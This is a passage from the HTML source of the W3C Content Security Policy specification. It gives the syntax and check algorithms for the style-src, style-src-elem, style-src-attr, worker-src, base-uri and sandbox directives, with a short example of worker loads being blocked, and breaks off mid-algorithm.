      <p>Inline <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#the-style-element" id="ref-for-the-style-element">style</a></code> blocks MUST pass through <a href="#should-block-inline" id="ref-for-should-block-inline⑤">§ 4.2.4 Should element’s inline type behavior be blocked by Content Security Policy?</a>. The
  styles will be blocked unless every policy allows inline style, either
  implicitly by not specifying a <code>style-src</code> (or <code>default-src</code>) directive,
  or explicitly, by specifying "<code>unsafe-inline</code>", a <a data-link-type="grammar" href="#grammardef-nonce-source" id="ref-for-grammardef-nonce-source③">nonce-source</a> or a <a data-link-type="grammar" href="#grammardef-hash-source" id="ref-for-grammardef-hash-source③">hash-source</a> that matches
  the inline block.</p>
     <li data-md>
      <p>The following CSS algorithms are gated on the <code>unsafe-eval</code> source
  expression:</p>
      <ol>
       <li data-md>
        <p><a data-link-type="dfn" href="https://www.w3.org/TR/cssom-1/#insert-a-css-rule" id="ref-for-insert-a-css-rule">insert a CSS rule</a></p>
       <li data-md>
        <p><a data-link-type="dfn" href="https://www.w3.org/TR/cssom-1/#parse-a-css-rule" id="ref-for-parse-a-css-rule">parse a CSS rule</a>,</p>
       <li data-md>
        <p><a data-link-type="dfn" href="https://www.w3.org/TR/cssom-1/#parse-a-css-declaration-block" id="ref-for-parse-a-css-declaration-block">parse a CSS declaration block</a></p>
       <li data-md>
        <p><a data-link-type="dfn" href="https://www.w3.org/TR/cssom-1/#parse-a-group-of-selectors" id="ref-for-parse-a-group-of-selectors">parse a group of selectors</a></p>
      </ol>
      <p>This would include, for example, all invocations of CSSOM’s various <code>cssText</code> setters and <code>insertRule</code> methods <a data-link-type="biblio" href="#biblio-cssom" title="CSS Object Model (CSSOM)">[CSSOM]</a> <a data-link-type="biblio" href="#biblio-html" title="HTML Standard">[HTML]</a>.</p>
      <p class="issue" id="issue-ba1a0a35"><a class="self-link" href="#issue-ba1a0a35"></a> This needs to be better explained. <a href="https://github.com/w3c/webappsec-csp/issues/212">[Issue #w3c/webappsec-csp#212]</a></p>
    </ol>
    <h5 class="heading settled algorithm" data-algorithm="style-src Pre-request Check" data-level="6.1.14.1" id="style-src-pre-request"><span class="secno">6.1.14.1. </span><span class="content"> <code>style-src</code> Pre-request Check </span><a class="self-link" href="#style-src-pre-request"></a></h5>
    <p>This directive’s <a data-link-type="dfn" href="#directive-pre-request-check" id="ref-for-directive-pre-request-check①⑤">pre-request check</a> is as follows:</p>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request④⑧">request</a> (<var>request</var>) and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object⑥⓪">policy</a> (<var>policy</var>):</p>
    <ol>
     <li data-md>
      <p>Let <var>name</var> be the result of executing <a href="#effective-directive-for-a-request">§ 6.7.1 Get the effective directive for request</a> on <var>request</var>.</p>
     <li data-md>
      <p>If the result of executing <a href="#should-directive-execute">§ 6.7.4 Should fetch directive execute</a> on <var>name</var>, <code>style-src</code> and <var>policy</var> is "<code>No</code>", return "<code>Allowed</code>".</p>
     <li data-md>
      <p>If the result of executing <a href="#match-nonce-to-source-list">§ 6.6.2.2 Does nonce match source list?</a> on <var>request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-nonce-metadata" id="ref-for-concept-request-nonce-metadata①">cryptographic nonce metadata</a> and this
  directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value③①">value</a> is "<code>Matches</code>", return
  "<code>Allowed</code>".</p>
     <li data-md>
      <p>If the result of executing <a href="#match-request-to-source-list">§ 6.6.2.3 Does request match source list?</a> on <var>request</var>, this directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value③②">value</a>, and <var>policy</var>,
  is "<code>Does Not Match</code>", return "<code>Blocked</code>".</p>
     <li data-md>
      <p>Return "<code>Allowed</code>".</p>
    </ol>
    <h5 class="heading settled algorithm" data-algorithm="style-src Post-request Check" data-level="6.1.14.2" id="style-src-post-request"><span class="secno">6.1.14.2. </span><span class="content"> <code>style-src</code> Post-request Check </span><a class="self-link" href="#style-src-post-request"></a></h5>
    <p>This directive’s <a data-link-type="dfn" href="#directive-post-request-check" id="ref-for-directive-post-request-check①⑥">post-request check</a> is as follows:</p>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request④⑨">request</a> (<var>request</var>), a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response③②">response</a> (<var>response</var>), and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object⑥①">policy</a> (<var>policy</var>):</p>
    <ol>
     <li data-md>
      <p>Let <var>name</var> be the result of executing <a href="#effective-directive-for-a-request">§ 6.7.1 Get the effective directive for request</a> on <var>request</var>.</p>
     <li data-md>
      <p>If the result of executing <a href="#should-directive-execute">§ 6.7.4 Should fetch directive execute</a> on <var>name</var>, <code>style-src</code> and <var>policy</var> is "<code>No</code>", return "<code>Allowed</code>".</p>
     <li data-md>
      <p>If the result of executing <a href="#match-nonce-to-source-list">§ 6.6.2.2 Does nonce match source list?</a> on <var>request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-nonce-metadata" id="ref-for-concept-request-nonce-metadata②">cryptographic nonce metadata</a> and this
  directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value③③">value</a> is "<code>Matches</code>", return
  "<code>Allowed</code>".</p>
     <li data-md>
      <p>If the result of executing <a href="#match-response-to-source-list">§ 6.6.2.4 Does response to request match source list?</a> on <var>response</var>, <var>request</var>, this directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value③④">value</a>,
  and <var>policy</var>, is "<code>Does Not Match</code>", return "<code>Blocked</code>".</p>
     <li data-md>
      <p>Return "<code>Allowed</code>".</p>
    </ol>
    <h5 class="heading settled algorithm" data-algorithm="style-src Inline Check" data-level="6.1.14.3" id="style-src-inline"><span class="secno">6.1.14.3. </span><span class="content"> <code>style-src</code> Inline Check </span><a class="self-link" href="#style-src-inline"></a></h5>
    <p>This directive’s <a data-link-type="dfn" href="#directive-inline-check" id="ref-for-directive-inline-check⑦">inline check</a> algorithm is as follows:</p>
    <p>Given an <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#element" id="ref-for-element⑥">Element</a></code> (<var>element</var>), a string (<var>type</var>), a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object⑥②">policy</a> (<var>policy</var>) and a string (<var>source</var>):</p>
    <ol>
     <li data-md>
      <p>Let <var>name</var> be the result of executing <a href="#effective-directive-for-inline-check">§ 6.7.2 Get the effective directive for inline checks</a> on <var>type</var>.</p>
     <li data-md>
      <p>If the result of executing <a href="#should-directive-execute">§ 6.7.4 Should fetch directive execute</a> on <var>name</var>, <code>style-src</code> and <var>policy</var> is "<code>No</code>", return "<code>Allowed</code>".</p>
     <li data-md>
      <p>If the result of executing <a href="#match-element-to-source-list">§ 6.6.3.3 Does element match source list for type and source?</a> on <var>element</var>, this directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value③⑤">value</a>, <var>type</var>,
  and <var>source</var>, is "<code>Does Not Match</code>", return "<code>Blocked</code>".</p>
     <li data-md>
      <p>Return "<code>Allowed</code>".</p>
    </ol>
    <p>This directive’s <a data-link-type="dfn" href="#directive-initialization" id="ref-for-directive-initialization①">initialization</a> algorithm is as follows:</p>
    <p class="issue" id="issue-6fa220c3"><a class="self-link" href="#issue-6fa220c3"></a> Do something interesting to the execution context in order to lock down
  interesting CSSOM algorithms. I don’t think CSSOM gives us any hooks here, so
  let’s work with them to put something reasonable together.</p>
    <h4 class="heading settled" data-level="6.1.15" id="directive-style-src-elem"><span class="secno">6.1.15. </span><span class="content"><code>style-src-elem</code></span><a class="self-link" href="#directive-style-src-elem"></a></h4>
    <p>The syntax for the directive’s name and value is described by the following ABNF:</p>
<pre>directive-name  = "style-src-elem"
directive-value = <a data-link-type="grammar" href="#grammardef-serialized-source-list" id="ref-for-grammardef-serialized-source-list①④">serialized-source-list</a>
</pre>
    <p>The <dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="style-src-elem">style-src-elem</dfn> directive governs the behaviour of styles
  except for styles defined in inline attributes.</p>
    <h5 class="heading settled algorithm" data-algorithm="style-src-elem Pre-request Check" data-level="6.1.15.1" id="style-src-elem-pre-request"><span class="secno">6.1.15.1. </span><span class="content"> <code>style-src-elem</code> Pre-request Check </span><a class="self-link" href="#style-src-elem-pre-request"></a></h5>
    <p>This directive’s <a data-link-type="dfn" href="#directive-pre-request-check" id="ref-for-directive-pre-request-check①⑥">pre-request check</a> is as follows:</p>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request⑤⓪">request</a> (<var>request</var>) and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object⑥③">policy</a> (<var>policy</var>):</p>
    <ol>
     <li data-md>
      <p>Let <var>name</var> be the result of executing <a href="#effective-directive-for-a-request">§ 6.7.1 Get the effective directive for request</a> on <var>request</var>.</p>
     <li data-md>
      <p>If the result of executing <a href="#should-directive-execute">§ 6.7.4 Should fetch directive execute</a> on <var>name</var>, <code>style-src-elem</code> and <var>policy</var> is "<code>No</code>", return "<code>Allowed</code>".</p>
     <li data-md>
      <p>If the result of executing <a href="#match-nonce-to-source-list">§ 6.6.2.2 Does nonce match source list?</a> on <var>request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-nonce-metadata" id="ref-for-concept-request-nonce-metadata③">cryptographic nonce metadata</a> and this
  directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value③⑥">value</a> is "<code>Matches</code>", return
  "<code>Allowed</code>".</p>
     <li data-md>
      <p>If the result of executing <a href="#match-request-to-source-list">§ 6.6.2.3 Does request match source list?</a> on <var>request</var>, this directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value③⑦">value</a>, and <var>policy</var>,
  is "<code>Does Not Match</code>", return "<code>Blocked</code>".</p>
     <li data-md>
      <p>Return "<code>Allowed</code>".</p>
    </ol>
    <h5 class="heading settled algorithm" data-algorithm="style-src-elem Post-request Check" data-level="6.1.15.2" id="style-src-elem-post-request"><span class="secno">6.1.15.2. </span><span class="content"> <code>style-src-elem</code> Post-request Check </span><a class="self-link" href="#style-src-elem-post-request"></a></h5>
    <p>This directive’s <a data-link-type="dfn" href="#directive-post-request-check" id="ref-for-directive-post-request-check①⑦">post-request check</a> is as follows:</p>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request⑤①">request</a> (<var>request</var>), a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response③③">response</a> (<var>response</var>), and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object⑥④">policy</a> (<var>policy</var>):</p>
    <ol>
     <li data-md>
      <p>Let <var>name</var> be the result of executing <a href="#effective-directive-for-a-request">§ 6.7.1 Get the effective directive for request</a> on <var>request</var>.</p>
     <li data-md>
      <p>If the result of executing <a href="#should-directive-execute">§ 6.7.4 Should fetch directive execute</a> on <var>name</var>, <code>style-src-elem</code> and <var>policy</var> is "<code>No</code>", return "<code>Allowed</code>".</p>
     <li data-md>
      <p>If the result of executing <a href="#match-nonce-to-source-list">§ 6.6.2.2 Does nonce match source list?</a> on <var>request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-nonce-metadata" id="ref-for-concept-request-nonce-metadata④">cryptographic nonce metadata</a> and this
  directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value③⑧">value</a> is "<code>Matches</code>", return
  "<code>Allowed</code>".</p>
     <li data-md>
      <p>If the result of executing <a href="#match-response-to-source-list">§ 6.6.2.4 Does response to request match source list?</a> on <var>response</var>, <var>request</var>, this directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value③⑨">value</a>,
  and <var>policy</var>, is "<code>Does Not Match</code>", return "<code>Blocked</code>".</p>
     <li data-md>
      <p>Return "<code>Allowed</code>".</p>
    </ol>
    <h5 class="heading settled algorithm" data-algorithm="style-src-elem Inline Check" data-level="6.1.15.3" id="style-src-elem-inline"><span class="secno">6.1.15.3. </span><span class="content"> <code>style-src-elem</code> Inline Check </span><a class="self-link" href="#style-src-elem-inline"></a></h5>
    <p>This directive’s <a data-link-type="dfn" href="#directive-inline-check" id="ref-for-directive-inline-check⑧">inline check</a> algorithm is as follows:</p>
    <p>Given an <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#element" id="ref-for-element⑦">Element</a></code> (<var>element</var>), a string (<var>type</var>), a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object⑥⑤">policy</a> (<var>policy</var>) and a string (<var>source</var>):</p>
    <ol>
     <li data-md>
      <p>Let <var>name</var> be the result of executing <a href="#effective-directive-for-inline-check">§ 6.7.2 Get the effective directive for inline checks</a> on <var>type</var>.</p>
     <li data-md>
      <p>If the result of executing <a href="#should-directive-execute">§ 6.7.4 Should fetch directive execute</a> on <var>name</var>, <code>style-src-elem</code> and <var>policy</var> is "<code>No</code>", return "<code>Allowed</code>".</p>
     <li data-md>
      <p>If the result of executing <a href="#match-element-to-source-list">§ 6.6.3.3 Does element match source list for type and source?</a> on <var>element</var>, this directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value④⓪">value</a>, <var>type</var>,
  and <var>source</var>, is "<code>Does Not Match</code>", return "<code>Blocked</code>".</p>
     <li data-md>
      <p>Return "<code>Allowed</code>".</p>
    </ol>
    <h4 class="heading settled" data-level="6.1.16" id="directive-style-src-attr"><span class="secno">6.1.16. </span><span class="content"><code>style-src-attr</code></span><a class="self-link" href="#directive-style-src-attr"></a></h4>
    <p>The syntax for the directive’s name and value is described by the following ABNF:</p>
<pre>directive-name  = "style-src-attr"
directive-value = <a data-link-type="grammar" href="#grammardef-serialized-source-list" id="ref-for-grammardef-serialized-source-list①⑤">serialized-source-list</a>
</pre>
    <p>The <dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="style-src-attr">style-src-attr</dfn> directive governs the behaviour of style attributes.</p>
    <h5 class="heading settled algorithm" data-algorithm="style-src-attr Inline Check" data-level="6.1.16.1" id="style-src-attr-inline"><span class="secno">6.1.16.1. </span><span class="content"> <code>style-src-attr</code> Inline Check </span><a class="self-link" href="#style-src-attr-inline"></a></h5>
    <p>This directive’s <a data-link-type="dfn" href="#directive-inline-check" id="ref-for-directive-inline-check⑨">inline check</a> algorithm is as follows:</p>
    <p>Given an <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#element" id="ref-for-element⑧">Element</a></code> (<var>element</var>), a string (<var>type</var>), a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object⑥⑥">policy</a> (<var>policy</var>) and a string (<var>source</var>):</p>
    <ol>
     <li data-md>
      <p>Let <var>name</var> be the result of executing <a href="#effective-directive-for-inline-check">§ 6.7.2 Get the effective directive for inline checks</a> on <var>type</var>.</p>
     <li data-md>
      <p>If the result of executing <a href="#should-directive-execute">§ 6.7.4 Should fetch directive execute</a> on <var>name</var>, <code>style-src-attr</code> and <var>policy</var> is "<code>No</code>", return "<code>Allowed</code>".</p>
     <li data-md>
      <p>If the result of executing <a href="#match-element-to-source-list">§ 6.6.3.3 Does element match source list for type and source?</a> on <var>element</var>, this directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value④①">value</a>, <var>type</var>,
  and <var>source</var>, is "<code>Does Not Match</code>", return "<code>Blocked</code>".</p>
     <li data-md>
      <p>Return "<code>Allowed</code>".</p>
    </ol>
    <h4 class="heading settled" data-level="6.1.17" id="directive-worker-src"><span class="secno">6.1.17. </span><span class="content"><code>worker-src</code></span><a class="self-link" href="#directive-worker-src"></a></h4>
    <p>The <dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="worker-src">worker-src</dfn> directive restricts the URLs which may be loaded as
  a <code class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/workers.html#worker" id="ref-for-worker②">Worker</a></code>, <code class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/workers.html#sharedworker" id="ref-for-sharedworker①">SharedWorker</a></code>, or <code class="idl"><a data-link-type="idl" href="https://www.w3.org/TR/service-workers/#serviceworker" id="ref-for-serviceworker①">ServiceWorker</a></code>. The syntax for the
  directive’s name and value is described by the following ABNF:</p>
<pre>directive-name  = "worker-src"
directive-value = <a data-link-type="grammar" href="#grammardef-serialized-source-list" id="ref-for-grammardef-serialized-source-list①⑥">serialized-source-list</a>
</pre>
    <div class="example" id="example-fd6c5849">
     <a class="self-link" href="#example-fd6c5849"></a> Given a page with the following Content Security Policy: 
<pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy①⑥">Content-Security-Policy</a>: <a data-link-type="dfn" href="#worker-src" id="ref-for-worker-src③">worker-src</a> https://example.com/
</pre>
     <p>Fetches for the following code will return a network errors, as the URL
    provided do not match <code>worker-src</code>’s <a data-link-type="dfn" href="#source-lists" id="ref-for-source-lists①⓪">source list</a>:</p>
<pre class="highlight"><c- p>&lt;</c-><c- f>script</c-><c- p>></c->
  <c- a>var</c-> blockedWorker <c- o>=</c-> <c- ow>new</c-> Worker<c- p>(</c-><c- u>"data:application/javascript,..."</c-><c- p>);</c->
  blockedWorker <c- o>=</c-> <c- ow>new</c-> SharedWorker<c- p>(</c-><c- u>"https://example.org/"</c-><c- p>);</c->
  navigator<c- p>.</c->serviceWorker<c- p>.</c->register<c- p>(</c-><c- t>'https://example.org/sw.js'</c-><c- p>);</c->
<c- p>&lt;/</c-><c- f>script</c-><c- p>></c->
</pre>
    </div>
    <h5 class="heading settled algorithm" data-algorithm="worker-src Pre-request Check" data-level="6.1.17.1" id="worker-src-pre-request"><span class="secno">6.1.17.1. </span><span class="content"> <code>worker-src</code> Pre-request Check </span><a class="self-link" href="#worker-src-pre-request"></a></h5>
    <p>This directive’s <a data-link-type="dfn" href="#directive-pre-request-check" id="ref-for-directive-pre-request-check①⑦">pre-request check</a> is as follows:</p>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request⑤②">request</a> (<var>request</var>) and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object⑥⑦">policy</a> (<var>policy</var>):</p>
    <ol>
     <li data-md>
      <p>Let <var>name</var> be the result of executing <a href="#effective-directive-for-a-request">§ 6.7.1 Get the effective directive for request</a> on <var>request</var>.</p>
     <li data-md>
      <p>If the result of executing <a href="#should-directive-execute">§ 6.7.4 Should fetch directive execute</a> on <var>name</var>, <code>worker-src</code> and <var>policy</var> is "<code>No</code>", return "<code>Allowed</code>".</p>
     <li data-md>
      <p>If the result of executing <a href="#match-request-to-source-list">§ 6.6.2.3 Does request match source list?</a> on <var>request</var>, this directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value④②">value</a>, and <var>policy</var>,
  is "<code>Does Not Match</code>", return "<code>Blocked</code>".</p>
     <li data-md>
      <p>Return "<code>Allowed</code>".</p>
    </ol>
    <h5 class="heading settled algorithm" data-algorithm="worker-src Post-request Check" data-level="6.1.17.2" id="worker-src-post-request"><span class="secno">6.1.17.2. </span><span class="content"> <code>worker-src</code> Post-request Check </span><a class="self-link" href="#worker-src-post-request"></a></h5>
    <p>This directive’s <a data-link-type="dfn" href="#directive-post-request-check" id="ref-for-directive-post-request-check①⑧">post-request check</a> is as follows:</p>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request⑤③">request</a> (<var>request</var>), a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response③④">response</a> (<var>response</var>), and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object⑥⑧">policy</a> (<var>policy</var>):</p>
    <ol>
     <li data-md>
      <p>Let <var>name</var> be the result of executing <a href="#effective-directive-for-a-request">§ 6.7.1 Get the effective directive for request</a> on <var>request</var>.</p>
     <li data-md>
      <p>If the result of executing <a href="#should-directive-execute">§ 6.7.4 Should fetch directive execute</a> on <var>name</var>, <code>worker-src</code> and <var>policy</var> is "<code>No</code>", return "<code>Allowed</code>".</p>
     <li data-md>
      <p>If the result of executing <a href="#match-response-to-source-list">§ 6.6.2.4 Does response to request match source list?</a> on <var>response</var>, <var>request</var>, this directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value④③">value</a>,
  and <var>policy</var>, is "<code>Does Not Match</code>", return "<code>Blocked</code>".</p>
     <li data-md>
      <p>Return "<code>Allowed</code>".</p>
    </ol>
    <h3 class="heading settled" data-level="6.2" id="directives-document"><span class="secno">6.2. </span><span class="content"> Document Directives </span><a class="self-link" href="#directives-document"></a></h3>
    <p>The following directives govern the properties of a document or worker
  environment to which a policy applies.</p>
    <h4 class="heading settled" data-level="6.2.1" id="directive-base-uri"><span class="secno">6.2.1. </span><span class="content"><code>base-uri</code></span><a class="self-link" href="#directive-base-uri"></a></h4>
    <p>The <dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="base-uri">base-uri</dfn> directive restricts the <code class="idl"><a data-link-type="idl" href="https://url.spec.whatwg.org/#url" id="ref-for-url④">URL</a></code>s which can be used in
  a <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document①③">Document</a></code>'s <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#the-base-element" id="ref-for-the-base-element①">base</a></code> element. The syntax for the directive’s name and
  value is described by the following ABNF:</p>
<pre>directive-name  = "base-uri"
directive-value = <a data-link-type="grammar" href="#grammardef-serialized-source-list" id="ref-for-grammardef-serialized-source-list①⑦">serialized-source-list</a>
</pre>
    <p>The following algorithm is called during HTML’s <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/semantics.html#set-the-frozen-base-url" id="ref-for-set-the-frozen-base-url①">set the frozen base url</a> algorithm in order to monitor and enforce this directive:</p>
    <h5 class="heading settled dfn-paneled algorithm" data-algorithm="Is base allowed for document?" data-dfn-type="dfn" data-export data-level="6.2.1.1" data-lt="Is base allowed for document?" id="allow-base-for-document"><span class="secno">6.2.1.1. </span><span class="content"> Is <var>base</var> allowed for <var>document</var>? </span><a class="self-link" href="#allow-base-for-document" id="ref-for-allow-base-for-document①"></a></h5>
    <p>Given a <code class="idl"><a data-link-type="idl" href="https://url.spec.whatwg.org/#url" id="ref-for-url⑤">URL</a></code> (<var>base</var>), and a <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document①④">Document</a></code> (<var>document</var>), this algorithm
  returns "<code>Allowed</code>" if <var>base</var> may be used as the value of a <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#the-base-element" id="ref-for-the-base-element②">base</a></code> element’s <code><a data-link-type="element-sub" href="https://html.spec.whatwg.org/multipage/semantics.html#attr-base-href" id="ref-for-attr-base-href①">href</a></code> attribute, and "<code>Blocked</code>" otherwise:</p>
    <ol>
     <li data-md>
      <p>For each <var>policy</var> in <var>document</var>’s <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#global-object" id="ref-for-global-object①③">global object</a>’s <a data-link-type="dfn" href="#global-object-csp-list" id="ref-for-global-object-csp-list②②">csp list</a>:</p>
      <ol>
       <li data-md>
        <p>Let <var>source list</var> be <code>null</code>.</p>
       <li data-md>
        <p>If a <a data-link-type="dfn" href="#directives" id="ref-for-directives②⓪">directive</a> whose <a data-link-type="dfn" href="#directive-name" id="ref-for-directive-name①③">name</a> is
  "<code>base-uri</code>" is present in <var>policy</var>’s <a data-link-type="dfn" href="#policy-directive-set" id="ref-for-policy-directive-set①⓪">directive
  set</a>, set <var>source list</var> to that <a data-link-type="dfn" href="#directives" id="ref-for-directives②①">directive</a>’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value④④">value</a>.</p>
       <li data-md>
        <p>If <var>source list</var> is <code>null</code>, skip to the next <var>policy</var>.</p>
       <li data-md>
        <p>If the result of executing <a href="#match-url-to-source-list">§ 6.6.2.5 Does url match source list in origin with redirect count?</a> on <var>base</var>, <var>source list</var>, <var>policy</var>’s <a data-link-type="dfn" href="#policy-self-origin" id="ref-for-policy-self-origin②">self-origin</a>, and <code>0</code> is "<code>Does Not Match</code>":</p>
        <ol>
         <li data-md>
          <p>Let <var>violation</var> be the result of executing <a href="#create-violation-for-global">§ 2.4.1 Create a violation object for global, policy, and directive</a> on <var>document</var>’s <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#global-object" id="ref-for-global-object①④">global
  object</a>, <var>policy</var>, and "<a data-link-type="dfn" href="#base-uri" id="ref-for-base-uri"><code>base-uri</code></a>".</p>
         <li data-md>
          <p>Set <var>violation</var>’s <a data-link-type="dfn" href="#violation-resource" id="ref-for-violation-resource①①">resource</a> to "<code>inline</code>".</p>
         <li data-md>
          <p>Execute <a href="#report-violation">§ 5.3 Report a violation</a> on <var>violation</var>.</p>
         <li data-md>
          <p>If <var>policy</var>’s <a data-link-type="dfn" href="#policy-disposition" id="ref-for-policy-disposition①⑧">disposition</a> is "<code>enforce</code>",
  return "<code>Blocked</code>".</p>
        </ol>
      </ol>
      <p class="note" role="note"><span class="marker">Note:</span> We compare against the fallback base URL in order to deal correctly with things like <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#an-iframe-srcdoc-document" id="ref-for-an-iframe-srcdoc-document③">an iframe <code>srcdoc</code> <code>Document</code></a> which has been sandboxed into an opaque origin.</p>
     <li data-md>
      <p>Return "<code>Allowed</code>".</p>
    </ol>
    <h4 class="heading settled" data-level="6.2.2" id="directive-sandbox"><span class="secno">6.2.2. </span><span class="content"><code>sandbox</code></span><a class="self-link" href="#directive-sandbox"></a></h4>
    <p>The <dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="sandbox">sandbox</dfn> directive specifies an HTML sandbox policy which the
  user agent will apply to a resource, just as though it had been included in
  an <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element" id="ref-for-the-iframe-element②">iframe</a></code> with a <code><a data-link-type="element-sub" href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-iframe-sandbox" id="ref-for-attr-iframe-sandbox">sandbox</a></code> property.</p>
    <p>The directive’s syntax is described by the following ABNF grammar, with
  the additional requirement that each token value MUST be one of the
  keywords defined by HTML specification as allowed values for the <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element" id="ref-for-the-iframe-element③">iframe</a></code> <code><a data-link-type="element-sub" href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-iframe-sandbox" id="ref-for-attr-iframe-sandbox①">sandbox</a></code> attribute <a data-link-type="biblio" href="#biblio-html" title="HTML Standard">[HTML]</a>.</p>
<pre>directive-name  = "sandbox"
directive-value = "" / <a data-link-type="grammar" href="https://tools.ietf.org/html/rfc7230#section-3.2.6" id="ref-for-section-3.2.6">token</a> *( <a data-link-type="grammar" href="#grammardef-required-ascii-whitespace" id="ref-for-grammardef-required-ascii-whitespace③">required-ascii-whitespace</a> <a data-link-type="grammar" href="https://tools.ietf.org/html/rfc7230#section-3.2.6" id="ref-for-section-3.2.6①">token</a> )
</pre>
    <p>This directive has no reporting requirements; it will be ignored entirely when
  delivered in a <a data-link-type="http-header" href="#header-content-security-policy-report-only" id="ref-for-header-content-security-policy-report-only③"><code>Content-Security-Policy-Report-Only</code></a> header, or within
  a <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#meta" id="ref-for-meta①⓪">meta</a></code> element.</p>
    <h5 class="heading settled algorithm" data-algorithm="sandbox Response Check" data-level="6.2.2.1" id="sandbox-response"><span class="secno">6.2.2.1. </span><span class="content"> <code>sandbox</code> Response Check </span><a class="self-link" href="#sandbox-response"></a></h5>
    <p>This directive’s <a data-link-type="dfn" href="#directive-response-check" id="ref-for-directive-response-check②">response check</a> algorithm is as
  follows:</p>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request⑤④">request</a> (<var>request</var>), a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response③⑤">response</a> (<var>response</var>), and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object⑥⑨">policy</a> (<var>policy</var>):</p>
    <ol>
     <li data-md>
      <p class="assertion">Assert: <var>response</var> is unused.</p>
     <li data-md>
      <p>If <var>policy</var>’s <a data-link-type="dfn" href="#policy-disposition" id="ref-for-policy-disposition①⑨">disposition</a> is not "<code>enforce</code>", then
  return "<code>Allowed</code>".</p>
     <li data-md>
      <p>If <var>request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-destination" id="ref-for-concept-request-destination④">destination</a> is one of
  "<code>serviceworker</code>", "<code>sharedworker</code>", or "<code>worker</code>":</p>
      <ol>
       <li data-md>
        <p>If the result of the <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/browsers.html#parse-a-sandboxing-directive" id="ref-for-parse-a-sandboxing-directive">Parse a sandboxing directive</a> algorithm
  using this directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value④⑤">value</a> as the input
